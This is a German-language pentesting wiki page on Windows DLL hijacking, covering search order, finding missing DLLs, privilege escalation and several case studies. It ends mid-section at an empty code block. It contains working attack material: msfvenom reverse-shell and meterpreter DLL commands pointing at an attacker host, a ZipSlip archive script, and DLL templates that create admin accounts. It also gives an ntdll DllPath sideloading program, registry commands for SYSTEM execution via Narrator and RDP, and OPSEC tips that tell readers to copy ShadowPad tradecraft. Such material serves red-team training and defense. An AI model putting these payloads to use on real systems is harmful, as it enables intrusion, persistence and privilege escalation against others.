# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für code execution, das Erreichen von persistence und seltener für privilege escalation verwendet. Trotz des hier auf escalation liegenden Fokus bleibt die Methode des Hijackings über die Ziele hinweg gleich.

### Häufige Techniken

Mehrere Methoden werden für DLL Hijacking eingesetzt; ihre Wirksamkeit hängt von der DLL-Lade-Strategie der Anwendung ab:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, wodurch das Suchverhalten der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, damit die Anwendung denkt, es handele sich um eine benötigte, nicht vorhandene DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Kopie im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR configs und .NET implants auf DLL sideloading schichtet, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finden fehlender Dlls

Der gebräuchlichste Weg, fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn du allgemein nach **fehlenden DLLs** suchst, lässt du das für einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einem spezifischen ausführbaren Programm** suchst, solltest du **einen weiteren Filter wie "Process Name" "contains" `<exec name>` setzen, das Programm ausführen und das Erfassen der Events stoppen**.

## Exploiting Missing Dlls

Um privilege escalation zu erreichen, ist unsere beste Chance, in der Lage zu sein, **eine DLL zu schreiben, die ein privilegierter Prozess zu laden versuchen wird** an einem **Ort, an dem sie gesucht wird**. Daher können wir eine **DLL schreiben** in einem **Ordner**, in dem die **DLL vor** dem Ordner gesucht wird, in dem die **Original-DLL** liegt (ein ungewöhnlicher Fall), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird und die originale **DLL nirgendwo existiert**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-Anwendungen suchen nach DLLs, indem sie einer Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem des DLL Hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung ist, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Du kannst die **DLL search order auf 32-bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf Platz zwei. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine DLL durch Angabe des absoluten Pfads geladen werden kann**, statt nur des Namens. In diesem Fall wird die DLL **nur in diesem Pfad** gesucht (wenn die DLL Abhängigkeiten hat, werden diese so gesucht, als wären sie nur nach Namen geladen worden).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, aber ich werde sie hier nicht erklären.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Verwende ProcMon-Filter (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, die der Prozess abfragt, aber nicht finden kann.
2. Wenn die Binärdatei nach Zeitplan/als Service läuft, wird das Ablegen einer DLL mit einem dieser Namen im Anwendungsverzeichnis (search-order entry #1) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess nach `hostfxr.dll` in `C:\samples\app\` bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine payload DLL (z.B. reverse shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein ZipSlip-style arbitrary write ist, erstelle ein ZIP, dessen Eintrag aus dem Extraktionsverzeichnis entkommt, sodass die DLL im App-Ordner landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Übergib das Archiv an das überwachte Postfach oder die überwachte Freigabe; wenn die geplante Aufgabe den Prozess neu startet, lädt er die bösartige DLL und führt deinen Code als Dienstkonto aus.

### Erzwingen von sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, den DLL-Suchpfad eines neu erzeugten Prozesses deterministisch zu beeinflussen, besteht darin, das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen, wenn der Prozess mit den nativen APIs von ntdll erstellt wird. Indem du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und ohne Verwendung der sicheren Ladeflags), dazu gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib ein individuelles DllPath an, das auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein dropper/unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Ziel-Binärdatei eine DLL per Name auflöst, berücksichtigt der Loader während der Auflösung dieses übergebene DllPath und ermöglicht so zuverlässiges sideloading, selbst wenn die bösartige DLL nicht im gleichen Verzeichnis wie die Ziel-EXE liegt.

Hinweise/Einschränkungen
- Dies betrifft den erzeugten Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL per Import oder LoadLibrary nach Namen laden (kein absoluter Pfad und ohne Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, wide strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel für den operativen Einsatz
- Platziere eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder an die echte proxyt) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, von dem bekannt ist, dass es xmllite.dll per Name mit der oben beschriebenen Technik nachlädt. Der Loader löst den Import über den angegebenen DllPath auf und sideloads deine DLL.

Diese Technik wurde in der Wildnis beobachtet, um multi-stage sideloading chains zu treiben: ein initialer Launcher droppt eine Helfer-DLL, die dann ein Microsoft-signed, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der attacker’s DLL aus einem staging directory zu erzwingen.


#### Ausnahmen bei der dll-Suchreihenfolge in der Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge genannt:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL trägt**, angetroffen wird, umgeht das System die übliche Suche. Stattdessen führt es eine Prüfung auf redirection und ein manifest durch, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- In Fällen, in denen die DLL als eine **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der known DLL sowie alle abhängigen DLLs und **verzichtet auf den Suchvorgang**. Der Registryschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Falls eine **DLL Abhängigkeiten hat**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **module names** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Anforderungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal oder lateral movement), und dem **eine DLL fehlt**.
- Stelle sicher, dass für ein **Verzeichnis**, in dem nach der **DLL** gesucht wird, **Schreibzugriff** vorhanden ist. Dies kann das Verzeichnis des ausführbaren Programms oder ein Verzeichnis im system path sein.

Ja, die Voraussetzungen sind kompliziert zu finden, da **standardmäßig ziemlich ungewöhnlich ist, ein privilegiertes ausführbares Programm ohne dll zu finden**, und es noch **ungewöhnlicher ist, Schreibrechte auf einen Ordner im system path zu haben** (das hast du standardmäßig nicht). In fehlkonfigurierten Umgebungen ist dies aber möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME) Projekt ansehen. Selbst wenn das **Hauptziel des Projekts darin besteht, UAC zu bypass UAC**, findest du dort möglicherweise einen **PoC** für eine Dll hijaking für die Windows-Version, den du verwenden kannst (wahrscheinlich reicht es, nur den Pfad des Ordners anzupassen, in dem du Schreibrechte hast).

Beachte, dass du deine **Berechtigungen in einem Ordner prüfen kannst**, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die imports einer ausführbaren Datei und die exports einer dll mit folgendem prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man Dll Hijacking ausnutzt, um Privilegien zu eskalieren, wenn Schreibberechtigungen in einem System Path folder vorhanden sind, siehe:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) prüft, ob du Schreibberechtigungen für einen Ordner innerhalb des system PATH hast.\
Weitere interessante automatisierte Tools zur Entdeckung dieser Schwachstelle sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Beispiel

Falls du ein ausnutzbares Szenario findest, gehört zu den wichtigsten Dingen, um es erfolgreich auszunutzen, das **Erstellen einer dll, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachte außerdem, dass Dll Hijacking nützlich ist, um [von Medium Integrity level zu High **(bypassing UAC)** zu eskalieren](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige dll erstellt**, findest du in dieser Untersuchung zu dll hijacking, die sich auf dll hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **einfache dll-Codes**, die als **Vorlagen** nützlich sein könnten oder zum Erstellen einer **dll mit nicht benötigten exportierten Funktionen**.

## **Erstellen und Kompilieren von Dlls**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine Dll, die in der Lage ist, **deinen bösartigen Code beim Laden auszuführen**, aber auch so zu **exponieren** und zu **funktionieren**, wie erwartet, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich ein ausführbares Programm angeben und die Bibliothek auswählen, die du proxify möchtest, und eine proxified dll generieren, oder die Dll angeben und eine proxified dll generieren.

### **Meterpreter**

**Hole rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86 — ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, mehrere Funktionen **exportieren muss**, die vom victim process geladen werden. Wenn diese Funktionen nicht existieren, wird die **binary sie nicht laden können** und der **exploit wird fehlschlagen**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die für arbitrary code execution und persistence gehijackt werden kann.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ein naiver hijack wird die UI sprechen/hervorheben. Um still zu bleiben, beim Anfügen Narrator-Threads auflisten, den Hauptthread öffnen (`OpenThread(THREAD_SUSPEND_RESUME)`) und mit `SuspendThread` anhalten; in Ihrem eigenen Thread fortfahren. Siehe PoC für vollständigen Code.

Trigger und Persistenz via Accessibility-Konfiguration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt das Starten von Narrator die platzierte DLL. Auf dem sicheren Desktop (Anmeldebildschirm) drücken Sie CTRL+WIN+ENTER, um Narrator zu starten; Ihre DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

RDP-triggered SYSTEM-Ausführung (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Die Ausführung stoppt, wenn die RDP-Sitzung geschlossen wird — inject/migrate zeitnah.

Bring Your Own Accessibility (BYOA)
- Sie können einen integrierten Accessibility Tool (AT)-Registry-Eintrag (z. B. CursorIndicator) klonen, ihn so bearbeiten, dass er auf eine beliebige Binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch wird beliebige Ausführung im Accessibility-Framework ermöglicht.

Hinweise
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` leben; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.

### Details zur Schwachstelle

- **Komponente**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit-Implementierung

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stub im selben Verzeichnis ablegen und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer die Datei `hostfxr.dll` nach `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Auf das Ausführen der geplanten Aufgabe um 09:30 AM im Kontext des aktuellen Benutzers warten.
3. Wenn ein Administrator angemeldet ist, wenn die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Administrator-Session mit medium integrity.
4. Standardmäßige UAC bypass techniques verketten, um von medium integrity zu SYSTEM-Privilegien zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-basierte dropper mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- Der Benutzer lädt eine MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL search order zuerst wsc.dll aus dem Arbeitsverzeichnis und führt damit Code des Angreifers unter einem signierten Parent aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Nach Einträgen suchen, die Executables oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary inspizieren.
- Eingebettete/aufgeteilte payloads in der MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Nach mehreren kleinen Fragmenten suchen, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Legen Sie diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitim signierter Host (Avast). Der Prozess versucht, wsc.dll per Name aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine spezifischen exports erforderlich sind, kann DllMain ausreichen; andernfalls bauen Sie eine proxy DLL und leiten die benötigten exports an die genuine library weiter, während das payload in DllMain ausgeführt wird.
- Erstellen Sie ein minimales DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Exportanforderungen verwenden Sie ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine Forwarding-DLL zu erzeugen, die außerdem Ihr Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch das Host-Binary. Wenn der Host absolute Pfade oder sichere Lade-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl des Host-Binaries und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer **Triade aus drei Dateien** deployt, um sich in legitimer Software zu tarnen und gleichzeitig den Kern-Payload auf der Festplatte verschlüsselt zu halten:

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, damit sie wie ein Windows-Binary aussieht (z. B. `conhost.exe`), die Authenticode-Signatur bleibt jedoch gültig.
2. **Bösartige Loader-DLL** – wird neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise ein MFC-Binary, das mit dem ScatterBrain-Framework obfuskiert ist; ihre einzige Aufgabe ist es, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu mapen.
3. **Verschlüsselter Payload-Blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nach dem Memory-Mapping des entschlüsselten Payloads löscht der Loader die TMP-Datei, um forensische Spuren zu vernichten.

Tradecraft-Hinweise:

* Durch das Umbenennen der signierten EXE (während der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) kann sie sich als Windows-Binary tarnen und gleichzeitig die Vendor-Signatur behalten. Replizieren Sie daher Ink Dragon’s Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die tatsächlich AMD-/NVIDIA-Utilities sind.
* Da die ausführbare Datei als vertrauenswürdig gilt, müssen die meisten Allowlisting-Kontrollen nur Ihre bösartige DLL neben ihr finden. Konzentrieren Sie sich auf die Anpassung der Loader-DLL; das signierte Parent kann typischerweise unverändert ausgeführt werden.
* Der Decryptor von ShadowPad erwartet, dass der TMP-Blob neben dem Loader liegt und beschreibbar ist, damit er die Datei nach dem Mapping nullen kann. Halten Sie das Verzeichnis beschreibbar, bis der Payload geladen ist; sobald er im Speicher liegt, kann die TMP-Datei aus OPSEC-Gründen sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatoren koppeln DLL sideloading mit LOLBAS, sodass das einzige kundenspezifische Artefakt auf der Festplatte die bösartige DLL neben der vertrauenswürdigen EXE ist:

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, zieht Befehle von einem Finger-Server und leitet sie an `cmd` weiter:

```powershell
